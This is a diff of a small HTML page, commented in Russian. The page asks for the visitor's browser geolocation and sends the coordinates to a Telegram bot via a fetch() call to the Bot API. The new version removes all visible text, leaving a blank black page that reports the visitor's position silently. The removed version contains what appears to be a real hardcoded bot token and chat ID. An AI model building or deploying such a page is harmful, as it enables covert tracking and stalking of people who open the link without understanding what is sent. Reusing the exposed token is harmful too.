@@ -1,49 +1,45 @@
-<!DOCTYPE html>
+
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Geolocation to Telegram</title>
+    <title>Геолокация</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: black;
+            height: 100vh;
+        }
+    </style>
 </head>
-<body style="background: black; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0;">
-    <h1>Пожалуйста, дайте разрешение на геолокацию...</h1>
+<body>
     <script>
-        // Ваши данные Telegram
-        const botToken = "7010906033:AAGe4fWmuWDvz4sw-CpIAs4V1sfZ52pzJbQ"; // Токен бота
-        const chatId = "2145450623"; // Ваш chat ID
+        // Ваш Telegram токен и chat_id
+        const botToken = "YOUR_BOT_TOKEN";
+        const chatId = "YOUR_CHAT_ID";
 
-        // Функция для отправки геолокации в Telegram
-        function sendLocationToTelegram(latitude, longitude) {
-            const message = `Координаты пользователя:\nШирота: ${latitude}\nДолгота: ${longitude}`;
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            
-            fetch(telegramUrl)
-                .then(response => {
-                    if (response.ok) {
-                        console.log("Геолокация успешно отправлена!");
-                    } else {
-                        console.error("Ошибка отправки данных в Telegram.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Ошибка подключения к Telegram API:", error);
-                });
+        // Функция отправки геолокации в Telegram
+        function sendLocation(latitude, longitude) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=Широта: ${latitude}, Долгота: ${longitude}`;
+            fetch(url)
+                .then(response => console.log('Геолокация отправлена.'))
+                .catch(error => console.error('Ошибка отправки геолокации:', error));
         }
 
-        // Запрос геолокации у пользователя
+        // Запрашиваем геолокацию
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
-                (position) => {
+                position => {
                     const { latitude, longitude } = position.coords;
-                    sendLocationToTelegram(latitude, longitude);
+                    sendLocation(latitude, longitude);
                 },
-                (error) => {
-                    document.body.innerHTML = `<h1>Не удалось получить доступ к геолокации: ${error.message}</h1>`;
+                error => {
                     console.error("Ошибка получения геолокации:", error);
                 }
             );
         } else {
-            document.body.innerHTML = "<h1>Ваш браузер не поддерживает геолокацию.</h1>";
+            console.error("Геолокация не поддерживается этим браузером.");
         }
     </script>
 </body>
